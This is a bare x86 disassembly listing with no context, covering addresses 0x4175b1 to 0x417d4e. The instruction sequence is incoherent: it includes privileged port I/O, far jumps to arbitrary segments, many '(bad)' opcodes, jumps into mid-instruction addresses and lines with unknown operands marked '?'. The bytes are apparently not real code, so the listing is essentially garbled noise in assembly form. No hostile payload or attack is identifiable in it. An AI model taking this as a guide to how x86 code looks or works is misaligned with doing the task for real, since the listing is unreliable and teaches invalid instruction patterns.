  4175b1:	lock ret 
  4175b3:	mov    dh,0x0
  4175b5:	out    dx,al
  4175b6:	rcr    eax,0xcb
  4175b9:	rol    ah,cl
  4175bb:	mov    BYTE PTR [esi-0x37],dh
  4175be:	jge    0x417605
  4175c0:	xchg   edi,eax
  4175c1:	mov    ah,BYTE PTR ds:0x5e96d5f7
  4175c7:	shl    BYTE PTR [edx+ebp*2-0x53],cl
  4175cb:	sbb    bh,BYTE PTR [esp+ebx*4-0x2c]
  4175cf:	push   eax
  4175d0:	jmp    0x417554
  4175d2:	pop    ebp
  4175d3:	xchg   ecx,eax
  4175d4:	in     eax,0x80
  4175d6:	add    dh,BYTE PTR [edx+edx*1-0x7edde91a]
  4175dd:	ins    BYTE PTR es:[edi],dx
  4175de:	mov    es,WORD PTR [ebx+0x17]
  4175e1:	xor    edi,DWORD PTR [edx-0x43abbe3a]
  4175e7:	sub    al,0x3e
  4175e9:	sbb    al,0xc6
  4175eb:	shl    BYTE PTR [ebp-0x1837c559],cl
  4175f1:	lods   eax,DWORD PTR ds:[esi]
  4175f2:	adc    eax,0x5c891d72
  4175f7:	cmp    eax,0x61e0fad7
  4175fc:	mov    edi,esi
  4175fe:	mov    al,ds:0x584f5643
  417603:	aaa    
  417604:	pop    esp
  417605:	mov    al,0xf0
  417607:	pushf  
  417608:	inc    esi
  417609:	xor    DWORD PTR [ecx-0x6a1f7f40],edx
  41760f:	cmp    eax,0xd3176587
  417614:	adc    cl,BYTE PTR [ebp-0x2caf0a2]
  41761a:	inc    ebp
  41761b:	dec    eax
  41761c:	call   0xd2770913
  417621:	fisubr DWORD PTR [edx-0x42]
  417624:	xor    al,0xfb
  417626:	clc    
  417627:	jle    0x4176a1
  417629:	fsubrp st(4),st
  41762b:	xor    BYTE PTR [edi],0xf4
  41762e:	aam    0x4a
  417630:	popf   
  417631:	js     0x4175e0
  417633:	pusha  
  417634:	dec    bp
  417636:	int3   
  417637:	jb     0x417632
  417639:	out    dx,al
  41763a:	in     eax,dx
  41763b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41763c:	mov    BYTE PTR [edx+ebx*8+0x1e27fad0],dh
  417643:	add    ebx,esp
  417645:	pop    ds
  417646:	lock mov edi,0xeaf5dbe4
  41764c:	outs   dx,DWORD PTR ds:[esi]
  41764d:	jmp    0x4176bb
  41764f:	outs   dx,DWORD PTR ds:[esi]
  417650:	not    DWORD PTR [ecx]
  417652:	dec    ecx
  417653:	lock pusha 
  417655:	push   ss
  417656:	test   eax,0x2dc2a0f1
  41765b:	test   edi,ebp
  41765d:	test   DWORD PTR [esi+eax*8-0x5e],0x82220aa9
  417665:	fistp  QWORD PTR es:[edi+0x36]
  417669:	mov    bh,0x69
  41766b:	iret   
  41766c:	xchg   bh,cl
  41766e:	mov    bl,0xd6
  417670:	js     0x417671
  417672:	daa    
  417673:	test   al,0xe2
  417675:	fstp   st(4)
  417677:	cmp    DWORD PTR [ebp+0x0],ebp
  41767a:	mov    ds:0x7344e349,al
  41767f:	mov    eax,ds:0x34ad95d1
  417684:	les    ebp,FWORD PTR [eax+0x9]
  417687:	pop    ebp
  417688:	adc    al,0x8
  41768a:	aad    0x8c
  41768c:	xchg   esp,eax
  41768d:	clc    
  41768e:	cmp    al,0x9e
  417690:	mov    bl,0xa1
  417692:	lahf   
  417693:	cdq    
  417694:	cmp    al,0x8c
  417696:	mov    es,WORD PTR [eax-0x59]
  417699:	sar    DWORD PTR [edx],0xa0
  41769c:	adc    BYTE PTR [ecx+0x18cca03a],ch
  4176a2:	pop    ss
  4176a3:	jg     0x4176de
  4176a5:	xor    BYTE PTR [esi+eiz*2-0x47],al
  4176a9:	mov    edi,esp
  4176ab:	pop    es
  4176ac:	test   eax,0xd67f224
  4176b1:	dec    esp
  4176b2:	cmp    ah,cl
  4176b4:	cwde   
  4176b5:	sub    al,0x9b
  4176b7:	or     eax,0x42e5ed00
  4176bc:	pop    ebp
  4176bd:	xlat   BYTE PTR ds:[ebx]
  4176be:	add    DWORD PTR [edi],eax
  4176c0:	test   eax,0x581c3300
  4176c5:	mov    esp,0x32ed3082
  4176ca:	xchg   edx,eax
  4176cb:	cld    
  4176cc:	aam    0x82
  4176ce:	dec    eax
  4176cf:	and    BYTE PTR [edi],ch
  4176d1:	ror    BYTE PTR ds:0x5306d484,1
  4176d7:	pop    edi
  4176d8:	cmp    al,0x43
  4176da:	sub    eax,0x7f65c1b8
  4176df:	jo     0x417669
  4176e1:	fldenv [esi-0x5eca5eb4]
  4176e7:	inc    ebp
  4176e8:	call   0x7df201df
  4176ed:	ins    BYTE PTR es:[edi],dx
  4176ee:	add    DWORD PTR [ecx-0x543b7a6d],ecx
  4176f4:	mov    dl,0x1c
  4176f6:	cmp    DWORD PTR [edi-0x6cbd0565],0x7469342a
  417700:	repnz push ss
  417702:	mov    ds:0x436412a7,eax
  417707:	xlat   BYTE PTR ds:[ebx]
  417708:	sbb    al,0xe8
  41770a:	jg     0x417781
  41770c:	ja     0x417709
  41770e:	pop    edx
  41770f:	jle    0x4176f7
  417711:	lods   eax,DWORD PTR ds:[esi]
  417712:	pop    ds
  417713:	sbb    ah,BYTE PTR [esi-0x20]
  417716:	xor    al,ah
  417718:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417719:	lock outs dx,BYTE PTR ds:[esi]
  41771b:	mov    ds:0x390666fb,al
  417720:	sahf   
  417721:	or     DWORD PTR [edi+edi*4+0x72],0x723c5db0
  417729:	(bad)  
  41772a:	(bad)
  41772e:	xlat   BYTE PTR ds:[ebx]
  41772f:	sbb    al,0xf1
  417731:	(bad)  
  417732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417733:	sub    eax,0xa989ddd7
  417738:	and    edx,DWORD PTR [edx-0x6aa3ba4f]
  41773e:	xor    eax,0x88d51981
  417743:	data16 (bad) 
  417746:	mov    ebx,0x16bc36e5
  41774b:	mov    DWORD PTR [eax-0x6e],edx
  41774e:	shl    BYTE PTR [ecx],1
  417750:	add    al,0xc6
  417752:	mov    edi,0xd3c03b74
  417757:	cmp    ch,BYTE PTR [eax-0x5215562c]
  41775d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41775e:	mov    edi,0x9d59792d
  417763:	xlat   BYTE PTR ds:[ebx]
  417764:	push   ebx
  417765:	xchg   esi,eax
  417766:	cmc    
  417767:	(bad)  
  417768:	pop    edi
  417769:	out    0x6c,al
  41776b:	mov    al,ds:0x2d8ee969
  417770:	add    eax,0x1db391c6
  417775:	push   eax
  417776:	jmp    0x417723
  417778:	lods   eax,DWORD PTR ds:[esi]
  417779:	scas   eax,DWORD PTR es:[edi]
  41777a:	fcomp  DWORD PTR [edi-0xa0d1c8c]
  417780:	push   cs
  417781:	mov    dl,0xe8
  417783:	sti    
  417784:	out    dx,eax
  417785:	push   ebp
  417786:	or     ah,ah
  417788:	(bad)  
  417789:	cli    
  41778a:	cmp    DWORD PTR [ecx-0x4f],ebp
  41778d:	mov    cl,0x86
  41778f:	mov    ah,BYTE PTR [esi]
  417791:	test   ah,0x72
  417794:	xlat   BYTE PTR ds:[ebx]
  417795:	ret    0x1ce0
  417798:	ss test eax,0x83cd9d17
  41779e:	sbb    al,0x42
  4177a0:	fnstenv [ecx-0x38]
  4177a3:	push   0xcc8f1df5
  4177a8:	push   ebp
  4177a9:	(bad)  
  4177aa:	repz xor eax,DWORD PTR [edx+ecx*4-0x26]
  4177af:	push   edx
  4177b0:	int3   
  4177b1:	xchg   ebp,eax
  4177b2:	inc    edx
  4177b3:	jg     0x4177a1
  4177b5:	or     DWORD PTR [eax+0x4e],ebp
  4177b8:	mov    ecx,0x484d8b40
  4177bd:	mov    edx,0x7e1bbdad
  4177c2:	in     al,dx
  4177c3:	ds ins DWORD PTR es:[edi],dx
  4177c5:	leave  
  4177c6:	(bad)  [esi]
  4177c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177c9:	mov    ds:0x29c19d68,eax
  4177ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177cf:	adc    al,0x12
  4177d1:	dec    esp
  4177d2:	cmp    edi,DWORD PTR [esp+esi*2]
  4177d5:	sub    ch,BYTE PTR [edi]
  4177d7:	or     DWORD PTR [edx-0x78ea1ca5],edi
  4177dd:	in     eax,0xf0
  4177df:	dec    edx
  4177e0:	ret    0x620b
  4177e3:	pop    ebp
  4177e4:	rcr    BYTE PTR ds:0xacf4bc18,1
  4177ea:	push   ds
  4177eb:	mov    bh,0xba
  4177ed:	xchg   esi,eax
  4177ee:	inc    edi
  4177ef:	push   ecx
  4177f0:	loope  0x417789
  4177f2:	hlt    
  4177f3:	ret    
  4177f4:	xor    DWORD PTR [esi-0x56576acf],esp
  4177fa:	retf   0x2e8a
  4177fd:	aaa    
  4177fe:	sbb    al,0xbc
  417800:	daa    
  417801:	cmp    DWORD PTR [ebx+ebp*8],0x6
  417805:	mov    ds:0xbe19606,al
  41780a:	icebp  
  41780b:	jns    0x417843
  41780d:	push   esi
  41780e:	(bad)  
  41780f:	add    BYTE PTR [ebx+0x41],cl
  417812:	cmp    ch,bh
  417814:	ret    
  417815:	dec    ecx
  417816:	dec    ebx
  417817:	push   0xfffffff2
  417819:	mov    ebx,0xb06115e3
  41781e:	sub    al,BYTE PTR [edx+0x1a]
  417821:	push   eax
  417822:	js     0x4177cd
  417824:	cmp    ah,BYTE PTR [esi+eax*4+0x3a3151fe]
  41782b:	and    al,0x47
  41782d:	push   eax
  41782e:	das    
  41782f:	add    al,0xbd
  417831:	mov    bh,0xd7
  417833:	repz inc ebp
  417835:	and    DWORD PTR [ecx-0x5f],0x7d
  417839:	stos   DWORD PTR es:[edi],eax
  41783a:	lods   eax,DWORD PTR ds:[esi]
  41783b:	hlt    
  41783c:	push   es
  41783d:	jne    0x41782f
  41783f:	adc    ebx,DWORD PTR [esi]
  417841:	pop    ecx
  417842:	jl     0x4177f1
  417844:	add    al,0xe3
  417846:	jge    0x417809
  417848:	xlat   BYTE PTR ds:[ebx]
  417849:	lea    eax,[ecx+0x7e]
  41784c:	jmp    0x14ae:0x6d39783f
  417853:	sub    esp,eax
  417855:	jmp    0xdc42:0xf382fa5f
  41785c:	ret    
  41785d:	fisub  DWORD PTR [ebp-0x32527b77]
  417863:	shl    al,1
  417865:	xor    esi,DWORD PTR [esi+0x3e007b5a]
  41786b:	aaa    
  41786c:	aaa    
  41786d:	mov    dh,0xbb
  41786f:	push   ss
  417870:	push   ebp
  417871:	fcom   DWORD PTR [edi]
  417873:	mov    ds:0xf36c7a95,eax
  417878:	jo     0x417893
  41787a:	pop    esi
  41787b:	add    BYTE PTR [edx-0x349cabfb],0x1a
  417882:	xor    edi,ebp
  417884:	fist   WORD PTR [esi+0x3fd1163d]
  41788a:	mov    dh,0x45
  41788c:	lea    esp,[edx-0x4de0aa19]
  417892:	dec    eax
  417893:	sub    al,0x57
  417895:	mov    esp,0xd4cec011
  41789a:	xor    BYTE PTR [esi-0x609b75a7],cl
  4178a0:	inc    ebp
  4178a1:	loopne 0x417831
  4178a3:	inc    esi
  4178a4:	mov    ebx,0xccb63e5d
  4178a9:	push   0xd
  4178ab:	xor    eax,0xf64e2442
  4178b0:	add    DWORD PTR [eax+0x53b6ba03],0xfb4409f3
  4178ba:	mov    eax,0x4afc1808
  4178bf:	sub    edi,DWORD PTR [ecx-0x54]
  4178c2:	test   al,0x53
  4178c4:	mov    eax,0x9c1f8c39
  4178c9:	in     al,dx
  4178ca:	mov    esi,0xeea6e66d
  4178cf:	add    ebx,DWORD PTR [edi+0x3cefd5e3]
  4178d5:	shl    edi,1
  4178d7:	(bad)  
  4178d9:	mov    eax,0xd008a81e
  4178de:	or     DWORD PTR [esi-0x65],0x4eb710e9
  4178e5:	mov    bl,0xc3
  4178e7:	data16 scas al,BYTE PTR es:[edi]
  4178e9:	jecxz  0x4178f7
  4178eb:	repz fbld TBYTE PTR [edx]
  4178ee:	xor    al,0xf4
  4178f0:	sbb    eax,0xe5b889ef
  4178f5:	pop    ss
  4178f6:	and    al,0x5e
  4178f8:	push   es
  4178f9:	push   cs
  4178fa:	out    dx,eax
  4178fb:	and    ah,dl
  4178fd:	xchg   edi,eax
  4178fe:	xchg   esi,eax
  4178ff:	ss jbe 0x417897
  417902:	and    al,BYTE PTR [ecx-0x7c5b1cb3]
  417908:	ret    
  417909:	js     0x4178ae
  41790b:	popa   
  41790c:	pop    eax
  41790d:	outs   dx,BYTE PTR ds:[esi]
  41790e:	enter  0x232d,0x8b
  417912:	inc    esp
  417913:	sahf   
  417914:	repnz (bad) 
  417916:	sahf   
  417917:	mov    ds:0x5d3b9dc4,al
  41791c:	fisub  DWORD PTR [eax-0x5a]
  41791f:	jns    0x417950
  417921:	sub    ebp,DWORD PTR [ebp-0xf]
  417924:	cwde   
  417925:	dec    eax
  417926:	add    cl,BYTE PTR [edx]
  417928:	ret    0xf8d9
  41792b:	mov    ebx,0x5fe36bef
  417930:	aaa    
  417931:	mov    cl,0x32
  417933:	rol    DWORD PTR [ebx-0x10],1
  417936:	sub    eax,0x69095200
  41793b:	cli    
  41793c:	mov    ecx,0xf6d973f1
  417941:	xor    eax,0x9f4da70d
  417946:	lods   al,BYTE PTR ds:[esi]
  417947:	aas    
  417948:	and    DWORD PTR ss:[esi-0x33],0x271820ed
  417950:	pop    eax
  417951:	ja     0x41796b
  417953:	out    dx,al
  417954:	mov    bh,0xf0
  417956:	jecxz  0x41792b
  417958:	data16 hlt 
  41795a:	push   esi
  41795b:	inc    esp
  41795c:	xchg   edx,eax
  41795d:	push   ds
  41795e:	mov    ch,0xa6
  417960:	xchg   ebx,eax
  417961:	and    eax,0x9a6d316f
  417966:	push   ebx
  417967:	xor    bl,BYTE PTR [edx-0x66]
  41796a:	adc    eax,0x49919079
  41796f:	in     al,0x66
  417971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417972:	out    0x6e,eax
  417974:	lods   al,BYTE PTR ds:[esi]
  417975:	pop    ds
  417976:	dec    esp
  417977:	adc    DWORD PTR [eax],0xda30e8d3
  41797d:	pop    ebx
  41797e:	and    ch,BYTE PTR [edx+0x3e60d239]
  417984:	or     ch,BYTE PTR [edx-0x11abc864]
  41798a:	das    
  41798b:	imul   esp,DWORD PTR [eax+0x67e62625],0xe526c1d3
  417995:	push   ds
  417996:	pop    edx
  417997:	push   edx
  417998:	xchg   ebx,eax
  417999:	int    0x31
  41799b:	pop    ds
  41799c:	push   edi
  41799d:	ret    0x1856
  4179a0:	shl    DWORD PTR [ebx-0x3d85b2eb],cl
  4179a6:	or     ebp,DWORD PTR [ebp-0x17]
  4179a9:	stos   BYTE PTR es:[edi],al
  4179aa:	adc    dl,BYTE PTR [ecx+edx*4+0x74]
  4179ae:	add    ebx,esp
  4179b0:	pop    ss
  4179b1:	sbb    eax,0x79e0e526
  4179b6:	mov    dl,0x4c
  4179b8:	iret   
  4179b9:	xor    esi,DWORD PTR [esi]
  4179bb:	push   esp
  4179bc:	pop    ecx
  4179bd:	shl    edi,cl
  4179bf:	fdivr  DWORD PTR [edi]
  4179c1:	fucomi st,st(1)
  4179c3:	hlt    
  4179c4:	push   0xd0851bf3
  4179c9:	sbb    eax,0x7a042b8c
  4179ce:	and    dl,BYTE PTR [edx]
  4179d0:	dec    esp
  4179d1:	add    BYTE PTR [edx],bl
  4179d3:	push   cs
  4179d4:	sub    dl,BYTE PTR [edx-0x46]
  4179d7:	pusha  
  4179d8:	cmc    
  4179d9:	lds    esp,FWORD PTR [edi-0x5a7675d9]
  4179df:	les    ebx,FWORD PTR [edx+eax*4-0x62]
  4179e3:	mov    gs,WORD PTR [ebx]
  4179e5:	mov    ?,WORD PTR [ebp-0x13]
  4179e8:	in     al,dx
  4179e9:	adc    eax,0x8029a5bc
  4179ee:	ja     0x4179be
  4179f0:	xchg   ebx,eax
  4179f1:	arpl   WORD PTR [esp+ebp*8],bx
  4179f4:	mov    WORD PTR [ecx],gs
  4179f6:	mov    ecx,0x8e0dd91d
  4179fb:	add    BYTE PTR [ecx],0xb6
  4179fe:	cmp    bl,BYTE PTR [esi-0x74]
  417a01:	out    dx,eax
  417a02:	inc    ecx
  417a03:	push   ss
  417a04:	jns    0x4179d0
  417a06:	jecxz  0x4179a7
  417a08:	fmul   DWORD PTR [eax+esi*1+0xc]
  417a0c:	mov    esp,0xead8981b
  417a11:	test   eax,0x48449f9e
  417a16:	jp     0x417a1a
  417a18:	cmp    edi,ebp
  417a1a:	in     al,dx
  417a1b:	stc    
  417a1c:	stos   DWORD PTR es:[edi],eax
  417a1d:	ins    DWORD PTR es:[edi],dx
  417a1e:	aad    0x9e
  417a20:	adc    eax,0x9e634e6d
  417a25:	aad    0x4a
  417a27:	pop    ecx
  417a28:	test   BYTE PTR ds:0xc4f9de19,bl
  417a2e:	fisttp DWORD PTR [esi+0x8498040]
  417a34:	pop    edx
  417a35:	scas   al,BYTE PTR es:[edi]
  417a36:	cmp    DWORD PTR [esp+edi*8+0x6c9f5a8e],esp
  417a3d:	mov    esi,0x97f72512
  417a42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a43:	cmp    eax,0xbd7278c8
  417a48:	lods   eax,DWORD PTR ds:[esi]
  417a49:	and    dl,BYTE PTR [esi-0x3b]
  417a4c:	loope  0x417a5b
  417a4e:	fs test al,0x9e
  417a51:	fs pop ecx
  417a53:	cli    
  417a54:	jl     0x417a91
  417a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a57:	js     0x417a56
  417a59:	and    eax,0x9b56fbd2
  417a5e:	popa   
  417a5f:	xor    al,0x84
  417a61:	in     al,0xfc
  417a63:	cmp    esi,DWORD PTR es:[ebx+0x3f]
  417a67:	xchg   edi,eax
  417a68:	fldenv [edx+eax*4]
  417a6b:	frstor cs:[ebp+0x16]
  417a6f:	repnz sub eax,DWORD PTR [esi-0x1a9e3d6]
  417a76:	jmp    0xc15f04bd
  417a7b:	mov    BYTE PTR [edi-0x3d],0x4
  417a7f:	push   0xffffffd8
  417a81:	dec    edi
  417a82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a83:	shr    DWORD PTR [ebx-0x27943eee],1
  417a89:	cmc    
  417a8a:	jmp    0x417a44
  417a8c:	ins    BYTE PTR es:[edi],dx
  417a8d:	push   ss
  417a8e:	inc    eax
  417a8f:	call   FWORD PTR [ecx-0x720c7b67]
  417a95:	xor    DWORD PTR [ecx+0x1a],esp
  417a98:	jg     0x417a8e
  417a9a:	int    0xbc
  417a9c:	pop    edi
  417a9d:	mov    ds,WORD PTR [edi-0x176ccc60]
  417aa3:	js     0x417acf
  417aa5:	cmp    DWORD PTR [edi-0x6b],0x70
  417aa9:	xchg   edi,eax
  417aaa:	mov    ebx,0xef4377cc
  417aaf:	out    dx,al
  417ab0:	ds das 
  417ab2:	rcl    BYTE PTR [ebx],1
  417ab4:	(bad)  
  417ab5:	lahf   
  417ab6:	inc    esp
  417ab7:	sub    esi,ebx
  417ab9:	stos   BYTE PTR es:[edi],al
  417aba:	mov    cs,WORD PTR [ebx+0x4158d4d3]
  417ac0:	fsub   DWORD PTR [ecx+0x51e85026]
  417ac6:	add    al,cl
  417ac8:	inc    edi
  417ac9:	inc    ebx
  417aca:	cs xchg ebp,eax
  417acc:	mov    al,0xf8
  417ace:	int3   
  417acf:	dec    esi
  417ad0:	cld    
  417ad1:	cli    
  417ad2:	fld    DWORD PTR [edi]
  417ad4:	or     bh,BYTE PTR [eax]
  417ad6:	mov    esp,0x7e73fd53
  417adb:	iret   
  417adc:	std    
  417add:	lds    ebx,FWORD PTR [eax-0x557cabd2]
  417ae3:	enter  0x62cc,0x90
  417ae7:	sub    dl,BYTE PTR [eax-0x7b]
  417aea:	cld    
  417aeb:	dec    eax
  417aec:	cmp    DWORD PTR [ecx-0x242d1c7b],ecx
  417af2:	mov    al,ds:0x435a6b6f
  417af7:	inc    edx
  417af8:	and    dl,BYTE PTR [esi-0x2a2231e3]
  417afe:	xchg   ecx,eax
  417aff:	mov    esp,0x567c0606
  417b04:	bndldx bnd3,[ebx]
  417b07:	ret    
  417b08:	and    esp,DWORD PTR [eax+ecx*8+0x78]
  417b0c:	mov    ds:0x4edbf87,eax
  417b11:	icebp  
  417b12:	icebp  
  417b13:	popa   
  417b14:	loope  0x417ada
  417b16:	xchg   esi,eax
  417b17:	or     ecx,DWORD PTR [esp+edx*8-0x2d83e011]
  417b1e:	push   esi
  417b1f:	std    
  417b20:	out    dx,al
  417b21:	push   edi
  417b22:	mov    ebx,0x7e6e8d0e
  417b27:	retf   0xec54
  417b2a:	jnp    0x417b8a
  417b2c:	add    al,0xb9
  417b2e:	adc    BYTE PTR [edx-0x6a293b61],al
  417b34:	lock stos DWORD PTR es:[edi],eax
  417b36:	hlt    
  417b37:	aas    
  417b38:	cld    
  417b39:	js     0x417b19
  417b3b:	enter  0x24ee,0xea
  417b3f:	repnz mov BYTE PTR [esi],0xc3
  417b43:	outs   dx,DWORD PTR ds:[esi]
  417b44:	mul    DWORD PTR [eax-0x59]
  417b47:	or     DWORD PTR [edi-0x5d],esi
  417b4a:	ds jle 0x417b76
  417b4d:	test   eax,0x5575261
  417b52:	jp     0x417ada
  417b54:	enter  0xce74,0xca
  417b58:	imul   eax,DWORD PTR [edi-0x22],0xde285052
  417b5f:	dec    edx
  417b60:	test   ecx,0x560090f0
  417b66:	xchg   esi,eax
  417b67:	ins    DWORD PTR es:[edi],dx
  417b68:	jmp    0x417b87
  417b6a:	loop   0x417b82
  417b6c:	xchg   BYTE PTR [esi],bl
  417b6e:	call   0xbfbe:0xd3f21cef
  417b75:	test   al,0xb8
  417b77:	xchg   esp,eax
  417b78:	pushf  
  417b79:	push   esp
  417b7a:	xlat   BYTE PTR ds:[ebx]
  417b7b:	loope  0x417afe
  417b7d:	xchg   esi,eax
  417b7e:	mov    cl,0x49
  417b80:	xchg   BYTE PTR [ebx],bh
  417b82:	push   ebp
  417b83:	dec    edi
  417b84:	(bad)  
  417b85:	loope  0x417bbc
  417b87:	popf   
  417b88:	dec    esp
  417b89:	ds xchg esi,eax
  417b8b:	jmp    0x417b9c
  417b8d:	pop    ebp
  417b8e:	add    DWORD PTR [edi-0x31b3222f],eax
  417b94:	outs   dx,BYTE PTR ds:[esi]
  417b95:	add    eax,0x558efaa6
  417b9a:	jp     0x417b21
  417b9c:	jnp    0x417c04
  417b9e:	jecxz  0x417b8a
  417ba0:	inc    esp
  417ba1:	xor    al,0x4a
  417ba3:	xchg   esi,eax
  417ba4:	sahf   
  417ba5:	and    ch,BYTE PTR [edx+0xd01516]
  417bab:	sbb    dl,bh
  417bad:	dec    ebp
  417bae:	sar    BYTE PTR [ecx+0x77607754],0x1
  417bb5:	mov    dl,0xf8
  417bb7:	inc    ebx
  417bb8:	xchg   esp,eax
  417bb9:	scas   eax,DWORD PTR es:[edi]
  417bba:	and    al,BYTE PTR [esp+eax*2]
  417bbd:	test   DWORD PTR [bx+di-0x2b64],ebx
  417bc2:	lea    ecx,[eax-0x5e0aa82a]
  417bc8:	icebp  
  417bc9:	jae    0x417bf0
  417bcb:	es aad 0x37
  417bce:	lods   al,BYTE PTR ds:[esi]
  417bcf:	xor    DWORD PTR [edx],edi
  417bd1:	dec    ebp
  417bd2:	int3   
  417bd3:	jl     0x417b81
  417bd5:	pop    ecx
  417bd6:	fnstenv [edx+0x4d]
  417bd9:	mov    bl,0x90
  417bdb:	aas    
  417bdc:	xchg   edx,ebp
  417bde:	sub    ebx,DWORD PTR [ebx-0x56]
  417be1:	sub    BYTE PTR [esi+0x6],dh
  417be4:	mov    ds:0xddfec1a4,eax
  417be9:	inc    ebp
  417bea:	mov    edi,0x37e8fbfc
  417bef:	jno    0x417c16
  417bf1:	js     0x417c01
  417bf3:	sub    eax,0x5807431
  417bf8:	js     0x417c0a
  417bfa:	sbb    al,0xc4
  417bfc:	push   edi
  417bfd:	push   esp
  417bfe:	xchg   ebx,eax
  417bff:	into   
  417c00:	sub    DWORD PTR [edi],ebp
  417c02:	inc    eax
  417c03:	sub    al,0x55
  417c05:	jp     0x417b99
  417c07:	inc    esi
  417c08:	mov    eax,?
  417c0a:	iret   
  417c0b:	sahf   
  417c0c:	jnp    0x417bb1
  417c0e:	mov    edi,esi
  417c10:	adc    ah,BYTE PTR [ebx]
  417c12:	(bad)  
  417c13:	fild   QWORD PTR [eax+0x29]
  417c16:	mov    ebx,0x5a764e02
  417c1b:	mov    edx,eax
  417c1d:	rcl    DWORD PTR [eax-0x28],0xea
  417c21:	xchg   esi,eax
  417c22:	inc    ebx
  417c23:	in     al,0x29
  417c25:	dec    esi
  417c26:	adc    edx,DWORD PTR [ecx]
  417c28:	xchg   edx,eax
  417c29:	hlt    
  417c2a:	ret    0xca5d
  417c2d:	adc    eax,0x6853a864
  417c32:	lea    esi,ds:0x6804af1a
  417c38:	and    al,0x11
  417c3a:	fwait
  417c3b:	push   ecx
  417c3c:	push   cs
  417c3d:	dec    esp
  417c3e:	je     0x417cb2
  417c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c41:	cli    
  417c42:	sahf   
  417c43:	cmc    
  417c44:	and    DWORD PTR [ecx],ebp
  417c46:	cwde   
  417c47:	xor    dh,BYTE PTR [ebx-0x31]
  417c4a:	cmp    eax,0x368e46c5
  417c4f:	test   edx,eax
  417c51:	xchg   edi,eax
  417c52:	or     eax,0xcad129bc
  417c57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c58:	neg    BYTE PTR [ecx-0x72]
  417c5b:	popa   
  417c5c:	push   esi
  417c5d:	push   ebp
  417c5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c5f:	outs   dx,BYTE PTR ds:[esi]
  417c60:	xor    DWORD PTR [ecx],ebx
  417c62:	lds    ebx,FWORD PTR [edi-0x746a0712]
  417c68:	pushf  
  417c69:	jl     0x417c8c
  417c6b:	dec    esi
  417c6c:	popf   
  417c6d:	dec    ebx
  417c6e:	cli    
  417c6f:	mov    edi,ebp
  417c71:	add    DWORD PTR [ecx-0x3],edx
  417c74:	cmp    ebx,edx
  417c76:	add    dl,BYTE PTR [eax-0x238f7f92]
  417c7c:	inc    edi
  417c7d:	push   0x2
  417c7f:	pop    DWORD PTR [eax+ecx*8+0x6ed5d781]
  417c86:	icebp  
  417c87:	int3   
  417c88:	outs   dx,DWORD PTR ds:[esi]
  417c89:	fild   QWORD PTR [ecx-0x2c]
  417c8c:	ds add bh,dl
  417c8f:	jno    0x417d0e
  417c91:	mov    esp,0x9800015b
  417c96:	sub    eax,0x3a257ee4
  417c9b:	stos   BYTE PTR es:[edi],al
  417c9c:	and    al,0x8c
  417c9e:	sub    al,BYTE PTR [ebx+eax*1+0x2]
  417ca2:	push   cs
  417ca3:	(bad)  
  417ca4:	mov    ah,0x12
  417ca6:	int    0xf3
  417ca8:	leave  
  417ca9:	in     al,0xdc
  417cab:	mov    eax,0x59dadc06
  417cb0:	(bad)  
  417cb1:	jns    0x417ccc
  417cb3:	sbb    edi,eax
  417cb5:	popf   
  417cb6:	mov    dl,BYTE PTR [edi+ebp*8+0x64]
  417cba:	out    dx,eax
  417cbb:	into   
  417cbc:	sub    al,0xaa
  417cbe:	scas   eax,DWORD PTR es:[edi]
  417cbf:	test   edx,eax
  417cc1:	ds jge 0x417c47
  417cc4:	test   BYTE PTR [ebx+0x56],bh
  417cc7:	mov    dl,0xae
  417cc9:	and    ecx,DWORD PTR [eax-0x4b913515]
  417ccf:	push   edi
  417cd0:	ret    0xaeb1
  417cd3:	or     eax,ecx
  417cd5:	mov    edi,0x8578cc88
  417cda:	jb     0x417c64
  417cdc:	mov    bh,0xc
  417cde:	clc    
  417cdf:	mov    cl,BYTE PTR [ecx+0x7b]
  417ce2:	daa    
  417ce3:	retf   0x3049
  417ce6:	add    eax,DWORD PTR [ecx+0x46601457]
  417cec:	cld    
  417ced:	bound  edi,QWORD PTR [ecx+0x69]
  417cf0:	cmp    DWORD PTR ds:0x163e5531,ecx
  417cf6:	inc    esp
  417cf7:	push   ss
  417cf8:	leave  
  417cf9:	outs   dx,DWORD PTR ds:[esi]
  417cfa:	pop    edi
  417cfb:	popf   
  417cfc:	mov    DWORD PTR [edx],esi
  417cfe:	out    dx,al
  417cff:	(bad)  
  417d01:	mov    BYTE PTR [ecx-0x7f],cl
  417d04:	cwde   
  417d05:	test   BYTE PTR [ebp-0x10454640],ah
  417d0b:	rol    DWORD PTR [edx],1
  417d0d:	mov    dh,0xa5
  417d0f:	test   BYTE PTR [edi],dh
  417d11:	sti    
  417d12:	ret    
  417d13:	push   ebp
  417d14:	push   ecx
  417d15:	pop    esp
  417d16:	pop    esp
  417d17:	(bad)  
  417d18:	mov    eax,ds:0x9597164a
  417d1d:	push   esi
  417d1e:	pusha  
  417d1f:	jmp    0x2aba:0x8a49b981
  417d26:	ins    BYTE PTR es:[edi],dx
  417d27:	push   0x79
  417d29:	sub    BYTE PTR [eax+0x2b9f993b],bh
  417d2f:	arpl   bx,cx
  417d31:	jl     0x417cb3
  417d33:	jmp    0x417cbb
  417d35:	xchg   edx,eax
  417d36:	adc    esi,DWORD PTR [ecx-0x25]
  417d39:	pop    ds
  417d3a:	(bad)  
  417d3b:	cdq    
  417d3c:	xor    bh,BYTE PTR ds:0xfff41d91
  417d42:	icebp  
  417d43:	into   
  417d44:	cmp    ah,BYTE PTR [ebp-0x2]
  417d47:	retf   
  417d48:	xchg   esi,eax
  417d49:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  417d4b:	test   al,0xe6
  417d4d:	pop    esp
  417d4e:	mov    ds:0xc36a82d4,eax
